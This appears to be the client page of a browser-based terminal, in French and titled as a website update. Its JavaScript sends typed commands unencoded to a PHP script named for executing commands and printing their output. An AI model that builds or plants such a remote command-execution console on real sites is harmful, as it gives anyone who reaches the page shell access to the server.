<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8" />

        <title>Mise à jour du site web</title>

        <style type="text/css">
            body, html {
                margin: 0;
                padding: 0;
                background: black;
            }

            pre {
                background: black;
                font-family: "Courier New", Consolas, monospace;
                color: white;
                margin: 0;
                padding: 10px;
            }
        </style>

        <script type="text/javascript">
            function getXMLHttpRequest() {
                var xhr = null;

                if (window.XMLHttpRequest || window.ActiveXObject) {
                    if (window.ActiveXObject) {
                        try {
                            xhr = new ActiveXObject("Msxml2.XMLHTTP");
                        } catch(e) {
                            xhr = new ActiveXObject("Microsoft.XMLHTTP");
                        }
                    } else {
                        xhr = new XMLHttpRequest();
                    }
                } else {
                    alert("Votre navigateur ne supporte pas l'objet XMLHTTPRequest...");
                    return null;
                }

                return xhr;
            }

            function requestCommand(cmd) {
                var xhr = getXMLHttpRequest();

                xhr.onreadystatechange = function() {
                    if (xhr.readyState == 4 && (xhr.status == 200 || xhr.status == 0)) {
                        document.getElementById('output').innerHTML += xhr.responseText;
                        document.getElementsByTagName('input')[(document.getElementsByTagName('input').length-1)].focus();
                    }
                };

                xhr.open("GET", "d4peExecCommandAndPrintOutput.php?cmd="+cmd, true);
                xhr.send(null);
            }
        </script>
    </head>
    <body>
        <pre id="output"></pre>
    </body>
</html>